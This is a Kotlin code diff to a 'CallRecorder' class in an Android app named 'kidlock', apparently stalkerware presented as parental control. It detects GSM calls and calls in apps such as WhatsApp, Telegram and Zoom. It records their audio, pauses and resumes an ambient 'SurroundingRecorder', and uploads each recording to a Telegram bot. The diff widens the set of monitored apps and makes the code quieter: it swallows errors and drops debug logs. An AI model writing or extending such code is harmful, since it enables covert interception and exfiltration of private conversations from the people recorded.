@@ -1,5 +1,6 @@
 package com.kidlock
 
+import android.app.usage.UsageStatsManager
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
@@ -21,74 +22,78 @@ class CallRecorder(private val context: Context) {
     private var isRecording = false
     private val handler = Handler(Looper.getMainLooper())
 
-    // VOIP app packages to watch
     private val voipApps = setOf(
-        "com.whatsapp",
-        "com.whatsapp.w4b",
-        "org.telegram.messenger",
-        "com.viber.voip",
-        "com.skype.raider",
-        "com.google.android.apps.meetings"
+        "com.whatsapp", "com.whatsapp.w4b",
+        "org.telegram.messenger", "org.telegram.plus",
+        "com.viber.voip", "com.skype.raider",
+        "com.google.android.apps.meetings",
+        "us.zoom.videomeetings"
     )
 
     private val phoneReceiver = object : BroadcastReceiver() {
         override fun onReceive(ctx: Context, intent: Intent) {
-            val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
-            when (state) {
-                TelephonyManager.EXTRA_STATE_OFFHOOK -> startRecording("gsm_call")
-                TelephonyManager.EXTRA_STATE_IDLE -> if (isRecording) stopAndSend()
+            when (intent.getStringExtra(TelephonyManager.EXTRA_STATE)) {
+                TelephonyManager.EXTRA_STATE_OFFHOOK -> {
+                    SurroundingRecorder.pause()
+                    startRecording("gsm")
+                }
+                TelephonyManager.EXTRA_STATE_IDLE -> {
+                    if (isRecording) stopAndSend("📞 GSM Call")
+                    SurroundingRecorder.resume()
+                }
             }
         }
     }
 
-    // VOIP detection via foreground app polling
-    private var voipCheckRunning = false
     private var voipActive = false
+    private var voipCheckRunning = false
 
     private val voipChecker = object : Runnable {
         override fun run() {
-            val current = getForegroundApp()
-            if (current in voipApps) {
-                if (!voipActive && !isRecording) {
-                    voipActive = true
-                    startRecording("voip_${current.substringAfterLast('.')}")
-                }
-            } else {
-                if (voipActive && isRecording) {
+            if (!isRecording) {
+                val current = getForegroundApp()
+                if (current in voipApps) {
+                    if (!voipActive) {
+                        voipActive = true
+                        SurroundingRecorder.pause()
+                        startRecording("voip_${current.substringAfterLast('.')}")
+                    }
+                } else if (voipActive) {
                     voipActive = false
-                    stopAndSend()
+                    stopAndSend("📱 VOIP Call")
+                    SurroundingRecorder.resume()
                 }
             }
-            if (voipCheckRunning) handler.postDelayed(this, 2000)
+            if (voipCheckRunning) handler.postDelayed(this, 1500)
         }
     }
 
     private fun getForegroundApp(): String {
         return try {
-            val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
+            val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
             val now = System.currentTimeMillis()
-            val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, now - 5000, now)
+            val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, now - 5000, now)
             stats.maxByOrNull { it.lastTimeUsed }?.packageName ?: ""
         } catch (e: Exception) { "" }
     }
 
     fun start() {
-        context.registerReceiver(phoneReceiver, IntentFilter(TelephonyManager.ACTION_PHONE_STATE_CHANGED))
+        try {
+            context.registerReceiver(phoneReceiver, IntentFilter(TelephonyManager.ACTION_PHONE_STATE_CHANGED))
+        } catch (e: Exception) {}
         voipCheckRunning = true
         handler.post(voipChecker)
     }
 
-    private fun startRecording(label: String) {
+    fun startRecording(label: String) {
         if (isRecording) return
         try {
-            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
-            outputFile = File(context.cacheDir, "${label}_$timestamp.mp3")
+            val ts = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
+            outputFile = File(context.cacheDir, "${label}_$ts.mp4")
 
-            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                 MediaRecorder(context)
-            } else {
-                @Suppress("DEPRECATION") MediaRecorder()
-            }
+            else @Suppress("DEPRECATION") MediaRecorder()
 
             recorder?.apply {
                 setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION)
@@ -96,35 +101,35 @@ class CallRecorder(private val context: Context) {
                 setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                 setAudioSamplingRate(44100)
                 setAudioEncodingBitRate(128000)
-                setOutputFile(outputFile?.absolutePath)
+                setOutputFile(outputFile!!.absolutePath)
                 prepare()
                 start()
             }
-
             isRecording = true
-            Log.d("CallRecorder", "Recording started: ${outputFile?.name}")
         } catch (e: Exception) {
-            Log.e("CallRecorder", "startRecording error: ${e.message}")
+            Log.e("CallRecorder", "start error: ${e.message}")
             isRecording = false
+            try { recorder?.release() } catch (ex: Exception) {}
+            recorder = null
+            SurroundingRecorder.resume()
         }
     }
 
-    private fun stopAndSend() {
+    fun stopAndSend(caption: String = "📞 Call") {
+        if (!isRecording) return
         try {
             recorder?.apply { stop(); release() }
-            recorder = null
-            isRecording = false
+        } catch (e: Exception) {}
+        recorder = null
+        isRecording = false
 
-            outputFile?.let { file ->
-                if (file.exists() && file.length() > 1024) {
-                    TelegramListener.instance.sendAudio(
-                        file.absolutePath,
-                        "📞 Recording — ${SimpleDateFormat("dd MMM yyyy, HH:mm", Locale.getDefault()).format(Date())}"
-                    )
-                }
+        outputFile?.let { file ->
+            if (file.exists() && file.length() > 2048) {
+                val ts = SimpleDateFormat("dd MMM yyyy, HH:mm", Locale.getDefault()).format(Date())
+                TelegramListener.instance.sendAudio(file.absolutePath, "$caption — $ts")
+            } else {
+                file.delete()
             }
-        } catch (e: Exception) {
-            Log.e("CallRecorder", "stopAndSend error: ${e.message}")
         }
     }
 
